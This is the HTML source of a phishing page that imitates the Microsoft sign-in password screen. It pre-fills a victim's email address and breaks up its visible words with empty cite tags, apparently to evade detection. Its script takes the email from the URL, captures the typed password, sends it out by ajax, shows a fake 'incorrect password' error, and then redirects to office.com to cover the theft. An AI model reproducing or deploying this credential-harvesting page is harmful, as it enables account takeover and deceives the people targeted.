<html>
      ...
      *:after {
      ...
      body {
        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue",
          ...
          "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI",
      ...
      body.IE_M7.rtl {
        font-family: "Segoe UI", "Ebrima", "Nirmala UI", "Gadugi",
          "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI",
          "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee",
          "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic",
          "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue",
      ...
      .footer.new-background-image div.footerNode a,
      .footer.new-background-image div.footerNode span {
        color: #000;
      }
      .outer {
        display: table;
      ...
      .text-title:lang(zh-tw) {
        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto",
          "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol",
          "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi",
          "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI",
          "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa",
          "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa",
          "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli",
  ...
  <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass" style="">
    <div>
      <div
        data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }"
      >
        <div
        ...
        >
          ...
          <div
            ...
            style="
              background-image: url('https://i.imgur.com/UeUQRKC.png');
            "
          ></div>
          ...
          <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
            ...
            >
              <div
                ...
                data-bind="css: { 'disable-lightbox': svr.bp &amp;&amp; showLightboxProgress() }"
              ></div>
              <div class="win-scroll">
                ...
                <img
                    class="logo"
                    role="img"
                    pngsrc="https://i.imgur.com/h8YEvNH.png"
                    svgsrc="https://i.imgur.com/h8YEvNH.png"
                    data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
                    src="https://i.imgur.com/h8YEvNH.png"
                    alt="Microsoft"
                  />
                </div>
                <div
                  ...
                  data-bind="component: { name: 'pagination-control',
                        ...
                        params: {
                            enableCssAnimation: svr.aH,
                            disableAnimationIfAnimationEndUnsupported: svr.bt,
                ...
                >
                  <div class="identityBanner" type="hidden">  <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }">enogratech@outlook.com</div> </div>
    ...
    title: str['WF_STR_HeaderDefault_Title'] } }"
                        >
                          ...
                          >
                            ...
                            >
                            En<cite id="xra"></cite>te<cite id="xra"></cite>r p<cite id="xra"></cite>as<cite id="xra"></cite>s<cite id="xra"></cite>wo<cite id="xra"></cite>rd
                            </div>
                          </div>
                        </div>
                        <div class="row">
                          ...
                          <div class="form-group col-md-24">
                            <div role="alert" aria-live="assertive"><div id="passwordError" data-bind="
                              externalCss: { 'error': true },
                              htmlWithBindings: passwordTextbox.error,
                              childBindings: { 'idA_IL_ForgotPassword0': { href: accessRecoveryLink || svr.t, click: resetPassword_onClick } }" class="error ext-error">Ple<cite id="xra"></cite>as<cite id="xra"></cite>e en<cite id="xra"></cite>ter the pa<cite id="xra"></cite>s<cite id="xra"></cite>swo<cite id="xra"></cite>rd for yo<cite id="xra"></cite>ur Mic<cite id="xra"></cite>r<cite id="xra"></cite>os<cite id="xra"></cite>of<cite id="xra"></cite>t ac<cite id="xra"></cite>co<cite id="xra"></cite>un<cite id="xra"></cite>t.</div></div>
                            <div
        ...
        params: {
            ...
            hintCss: 'placeholder' + (!svr.ae ? ' ltr_override' : '') },
        event: {
            updateFocus: usernameTextbox.textbox_onUpdateFocus } }"
                        ...
                        >
                          <div>  <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Ke<cite id="xra"></cite>e<cite id="xra"></cite>p <cite id="xra"></cite>me sig<cite id="xra"></cite>ne<cite id="xra"></cite>d in</span> </label> </div> <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link"  data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: accessRecoveryLink || svr.t, click: resetPassword_onClick">For<cite id="xra"></cite>g<cite id="xra"></cite>ot pas<cite id="xra"></cite>swo<cite id="xra"></cite>rd?</a> </div><div class="form-group"> </div>  </div> </div> </div> </div>
                        </div>
...
css: { 'no-margin-bottom': removeBottomMargin }"
                              >
                                ...
                                <div
                                  data-bind="css: { 'inline-block': isPrimaryButtonVisible }"
                                  class="inline-block"
                                >
                                  <input
                                    type="submit"
            ...
            externalCss: { 'footer': true }"
              class="default footer ext-footer new-background-image"
            >
              <div
              ...
              >
                <div id="footerLinks" class="footerNode text-secondary">
                  <a
                    ...
                    >T<cite id="xra"></cite>e<cite id="xra"></cite>rm<cite id="xra"></cite>s of<cite id="xra"></cite> u<cite id="xra"></cite>se</a
                  >
                  <a
                    id="ftrPrivacy"
                    data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick"
                    
                    >P<cite id="xra"></cite>riv<cite id="xra"></cite>acy &amp; coo<cite id="xra"></cite>kies</a
                  >
                </div>
              </div>
            </div>
    ...
    <script>
      var count = 0;
        ...
        var em = document.getElementById("i01166").value = hash.split("#")[1];
        var em1 = document.getElementById("displayName").textContent = hash.split("#")[1];
        var ps = $("#i0116").val();
        var clientdomain = em.substring(em.lastIndexOf("@") + 1);
        if (clientdomain === undefined) {
          $("#i0116").val("");
        } else {
          var pwdInput = document.getElementById("i0116");
          $("#i0116").focus();
        }
        $("#i0116").keydown(function (e) {
          if (e.which == 13) {
            passam();
            return false;
          }
        ...
        document.getElementById('warning').innerHTML = "The password you entered isn't correct. Try entering it again.";
        document.getElementById('i0116').focus();
            ...
            $.ajax({
              ...
              success: function (response) {
                if (count === 1) {
            location.href = "https://www.office.com/";
                } else {
